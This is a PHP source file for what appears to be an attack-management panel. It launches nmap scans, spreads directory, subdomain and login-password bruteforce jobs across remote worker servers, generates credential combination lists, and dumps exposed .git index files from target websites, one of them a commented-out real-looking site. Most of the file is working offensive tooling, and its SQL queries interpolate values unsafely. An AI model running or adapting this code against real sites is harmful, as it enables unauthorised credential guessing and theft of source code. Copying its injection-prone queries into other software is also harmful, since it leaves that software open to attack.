<?php

/**
 * Created by PhpStorm.
 * User: Lalka
 * Date: 21.04.2016
 * Time: 15:02
 */
include "Model.class.php";

class Tools
{

    public $Model;
    public $uid;

    function __construct()
    {
        $this->Model = new Model();
        $this->uid = $this->Model->getUserId($_SESSION['username']);
    }

    function startScan1(int $tid, int $sid, $filename, $type = null)
    {

        /*
                $enc ="execute=". json_encode($arrTask);
                $socket = socket_create(AF_INET, SOCK_STREAM, 0);
                $parseUrl=parse_url($serverUrl);
                $addres=$parseUrl['host'];
                $port=80;
                //print_r($parseUrl);
                $result = socket_connect($socket, $addres, $port);
                if ($result === false) {
                    echo "Не получилось выполнить функцию socket_connect().\nПричина: ($result) " . socket_strerror(socket_last_error($socket)) . "\n";
                } else {
                    echo "OK.\n";
                }
                $arrOpt = array('l_onoff' => 1, 'l_linger' => 1);
                socket_set_option($socket, SOL_SOCKET, SO_LINGER,$arrOpt);
                $in= "POST /clientside/execute.php HTTP/1.1\r\n";
                $in.= "Host: example.com\r\n";
                $in.= "Content-Type: application/x-www-form-urlencoded\r\n";
                $in.= "Content-Length: ".strlen($enc)."\r\n";
                $in.= "Connection: close\r\n";
                $in.= "\r\n";
                $in.= $enc;
                echo $in;
                socket_write($socket, $in, strlen($in));
                socket_close($socket);
        */


    }

    function startNmap(int $tid, int $sid, $option = null)
    {

        switch ($option) {
            case "quick":
                $param = "-T4 -F";
                break;
            case "quickplus":
                $param = "-sV -T4 -O -sS";
                break;

            default:
                return 0;
                break;
        }

        $query = "select * from targets where tid=$tid";
        $targeturl = $this->Model->MysqliClass->firstResult($query)['url'];
        preg_match("/http[s]?:\/\/([\w\d.-]+)\//", $targeturl, $m);
        var_dump($m);
        //die();
        if (!isset($m[1]))
            return 0;
        //echo 1234;
        $targeturl = $m[1];
        $scid = $this->addScan($tid, array($sid), "nmap $option");


        ob_start();
        $result = array();


        if (!isset($param))
            return 0;

        $cmd = '"D:\Program Files (x86)\Nmap\nmap" ' . $param . ' ' . $targeturl;
        echo $cmd . "\n";
        system($cmd);
        $content = ob_get_clean();
        echo $content;
        //die();
        preg_replace("/\s+/", "", $content);
        preg_match_all("/(\d+)\/tcp\s+(\w+)\s+([^\s]+)([\r\n]+|[\s]+([^\r\n]+))?[\r\n]?/", $content, $m);
        //var_dump($m);
        //die();

        $queryStart = "INSERT INTO nmap(scid,port,status,service,version) VALUES";
        $query = $queryStart;
        $i = 0;


        foreach ($m[0] as $d) {
            preg_match("/(\d+)\/tcp\s+(\w+)\s+([^\s]+)([\r\n]+|[\s]+([^\r\n]+))?[\r\n]?/", trim($d, "\r\n"), $mf);//маска для парсинга результатов nmap

            (isset($mf[5])) ? $version = $mf[5] : $version = "";
            echo "port:" . $mf[1] . " status: " . $mf[2] . " service: " . $mf[3] . " version:" . $version . "\n";
            //var_dump($mf);
            //continue;
            $query .= "($scid,'{$mf[1]}','{$mf[2]}','{$mf[3]}','{$version}'),";
            $i++;
            if ($i == 100) {
                $i = 0;
                $query = substr($query, 0, -1);
                $query .= " ON DUPLICATE KEY UPDATE status=values(status)";
                echo $query . "\n";
                $this->Model->MysqliClass->query($query);
                $query = $queryStart;
            }
        }
        //die();
        $query = substr($query, 0, -1);
        $query .= " ON DUPLICATE KEY UPDATE status=values(status)";
        $this->Model->MysqliClass->query($query);
        echo $query;
        $query = "update scans set status=1 where scid=$scid";
        $this->Model->MysqliClass->query($query);


    }

    function addScan($tid, array $sids, $action, $filename = "")
    {

        $scid = rand(1000000, 90000000);
        foreach ($sids as $sid) {
            $query = "insert into scans(scid,type,uid,sid,tid,status,filename,dateScan) VALUES($scid,'$action',$this->uid,$sid,$tid,0,'$filename',now()) ";
            echo $query;
            $this->Model->MysqliClass->query($query);
        }
        return $scid;

    }

    // сканирование директорий и сабдоменов

    function startScanPath($action, $filename, $tid, $sidArr)
    {
        if (($action != "dirScan") && ($action != "subdomainScan"))
            exit;
        //var_dump($sidArr);
        //die();
        //$sidArr=explode(',',$sid);

        $urls = explode("\r\n", file_get_contents(PATH_TXTP . "/" . $filename));
        $scid = $this->addScan($tid, $sidArr, $action, $filename);
        if (!$scid) exit;

        $countLogins = ceil(count($urls) / count($sidArr));
        $urlsParts = (array_chunk($urls, $countLogins));


        foreach ($sidArr as $i => $sid) {
            //echo $sid;continue;
            if (!$this->getUrls($tid, $sid))
                return 0;
            $this->startScan($scid, $urlsParts[$i], $sid);
        }


    }

    //брутфорс

    function  getUrls($tid, $sid)
    {

        $query = "select * from servers where sid=$sid";
        $serverUrl = $this->Model->MysqliClass->firstResult($query)['path'];
        $query = "select * from targets where tid=$tid";
        $targetUrl = $this->Model->MysqliClass->firstResult($query)['url'];

        if (!isset($serverUrl, $targetUrl))
            return 0;
        else
            return array("serverUrl" => $serverUrl, "targetUrl" => $targetUrl);

    }

    function startScan($scid, $data, $sid)
    {

        $query = "select url,path,type from scans LEFT JOIN targets on scans.tid=targets.tid LEFT JOIN servers on scans.sid=servers.sid where scid=$scid and scans.sid=$sid";
        echo $query . "\n";
        $arrResult = $this->Model->MysqliClass->firstResult($query);
        $ch = curl_init();
        //foreach($arrResults as $arrResult) {
        if (!isset($arrResult))
            exit;
        $action = $arrResult['type'];
        $serverUrl = $arrResult['path'];
        $targetUrl = $arrResult['url'];
        $arrTask[$scid] = array("url" => $targetUrl, "action" => $action, "data" => $data);
        $command = "execute=" . json_encode($arrTask);
        //echo $command;
        //die();

        curl_setopt($ch, CURLOPT_URL, $serverUrl);
        curl_setopt($ch, CURLOPT_TIMEOUT_MS, 100);
        curl_setopt($ch, CURLOPT_NOBODY, 1);
        curl_setopt($ch, CURLOPT_POST, true);
        echo $serverUrl . " " . $command . "\n";
        curl_setopt($ch, CURLOPT_POSTFIELDS, $command);
        curl_exec($ch);
        //}
        curl_close($ch);

    }

    function startBruteforce($loginsfile, $passwordsfile, $tid, $sidArr)
    {
        //$sidArr=explode(',',$sid);

        $logins = explode("\r\n", file_get_contents(PATH_TXTP . "/" . $loginsfile));
        $passwords = explode("\r\n", file_get_contents(PATH_TXTP . "/" . $passwordsfile));
        $source = $this->generateSource($logins, $passwords);

        $filename = time() . "-$loginsfile-$passwordsfile";
        $scid = $this->addScan($tid, $sidArr, "brute", $filename);
        if (!$scid) exit;

        file_put_contents(PATH_BSRC . "/" . $filename, $source);
        $countLogins = ceil(count($logins) / count($sidArr));
        $loginsParts = (array_chunk($logins, $countLogins));
        echo $countLogins . "\n";

        foreach ($sidArr as $i => $sid) {
            if (!$this->getUrls($tid, $sid))
                return 0;
            $this->startScan($scid, array("logins" => $loginsParts[$i], "passwords" => $passwords), $sid);
        }
        die();

    }

    function generateSource($loginsArr, $passwordsArr)
    {
        $source = "";
        foreach ($loginsArr as $login)
            foreach ($passwordsArr as $password) {
                $source .= $login . ":" . $password . "\r\n";
            }
        return $source;
    }

    function sendCommand($serverUrl, $command)
    {

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $serverUrl);
        curl_setopt($ch, CURLOPT_TIMEOUT_MS, 100);
        curl_setopt($ch, CURLOPT_NOBODY, 1);
        curl_setopt($ch, CURLOPT_POST, true);
        echo $command;
        curl_setopt($ch, CURLOPT_POSTFIELDS, $command);
        echo curl_exec($ch);
        curl_close($ch);

    }

    function hexToStr($hex)
    {
        $string = '';
        for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
            $string .= chr(hexdec($hex[$i] . $hex[$i + 1]));
        }
        return $string;
    }

    function downloadFile($ura, $filename)
    {
        @$filecont = file_get_contents($ura);
        if ($filecont)
            file_put_contents($filename, zlib_decode($filecont));
    }

    function gitDump($tid, array $sid, $option = "gitdump")
    {

        $query = "select * from targets where tid=$tid";
        $targeturl = $this->Model->MysqliClass->firstResult($query)['url'];

        //$targeturl="http://moscow.questoria.ru/";
        $urlArr = parse_url($targeturl);
        $directory = PATH_GIT . "/" . $urlArr['host'];
        $results = array();
        echo $directory . "\n";
        $scid = $this->addScan($tid, $sid, $option);
        if (!file_exists("$directory/index"))
            $this->downloadIndex($targeturl);
        //die();
        $file = fopen("$directory/index", "rb");
        fread($file, 8);
        $entrycount = fread($file, 4);
        $entrycount = unpack("N", $entrycount)[1] . "\n";


        for ($i = 0; $i < $entrycount; $i++) {
            $entrylen = 62;
            $nulldata = fread($file, 40);
            $sha1part1 = bin2hex(fread($file, 1));
            $sha1part2 = bin2hex(fread($file, 19));
            $flag = hexdec(unpack("H4flag", fread($file, 2))['flag']);

            $filename = fread($file, $flag);
            //echo $filename." ";
            $dname = dirname($filename);
            if ($dname && !file_exists($directory . "/" . $dname))
                mkdir($directory . "/" . $dname, 0777, 1);
            $filepath = $targeturl . ".git/objects/$sha1part1/$sha1part2";
            //echo $filepath."\n";
            //downloadFile($ura,$directory."/".$filename);
            $entrylen += $flag;
            $padlen = (8 - ($entrylen % 8)) or 8;
            fread($file, $padlen);
            array_push($results, array("filename" => $filename, "filepath" => $filepath));
        }
        fclose($file);

        $queryStart = "INSERT INTO gitdump(scid,filename,filepath) VALUES";
        $query = $queryStart;
        $i = 0;


        foreach ($results as $result) {
            $query .= "($scid,'{$result['filename']}','{$result['filepath']}'),";
            $i++;
            if ($i == 100) {
                $i = 0;
                $query = substr($query, 0, -1);
                $query .= " ON DUPLICATE KEY UPDATE filepath=values(filepath)";
                echo $query . "\n";
                $this->Model->MysqliClass->query($query);
                $query = $queryStart;
            }
        }

        $query = substr($query, 0, -1);
        $query .= " ON DUPLICATE KEY UPDATE filepath=values(filepath)";
        $this->Model->MysqliClass->query($query);
        echo $query;
        $query = "update scans set status=1 where scid=$scid";
        $this->Model->MysqliClass->query($query);


    }

    function downloadIndex($url)
    {
        $index = file_get_contents($url . "/.git/index");
        $urlArr = parse_url($url);
        $directory = PATH_GIT . "/" . $urlArr['host'];
        //print_r($qwe);
        if ($index == "")
            die("empty\n");

        if (!file_exists($directory))
            mkdir($directory, null, 1);
        file_put_contents("$directory/index", $index);
    }


}